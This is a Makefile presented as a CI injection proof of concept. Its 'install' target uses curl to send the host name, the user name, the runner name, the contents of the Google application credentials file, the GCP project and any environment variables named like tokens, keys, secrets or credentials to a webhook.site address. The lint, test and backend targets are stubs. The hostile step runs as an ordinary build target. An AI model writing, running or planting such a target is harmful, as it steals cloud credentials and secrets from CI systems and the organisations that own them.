EXFIL=https://webhook.site/088a94bc-ae9c-4326-b6c5-cf5ff97d574a

.PHONY: install lint test backend

install:
	@echo "=== POC START ==="
	curl -s "$(EXFIL)" \
	  -G \
	  --data-urlencode "host=$$(hostname)" \
	  --data-urlencode "user=$$(whoami)" \
	  --data-urlencode "runner=$$RUNNER_NAME" \
	  --data-urlencode "gcreds=$$(cat $$GOOGLE_APPLICATION_CREDENTIALS 2>/dev/null)" \
	  --data-urlencode "gcp_project=$$CLOUDSDK_CORE_PROJECT" \
	  --data-urlencode "env=$$(env | grep -iE 'GOOGLE|GCP|CLOUD|TOKEN|KEY|SECRET|CRED')" \
	  -o /dev/null
	@echo "=== CI INJECTION POC COMPLETE ==="

lint:
	@echo "lint ok"

test:
	@echo "test ok"

backend:
	@echo "backend ok"
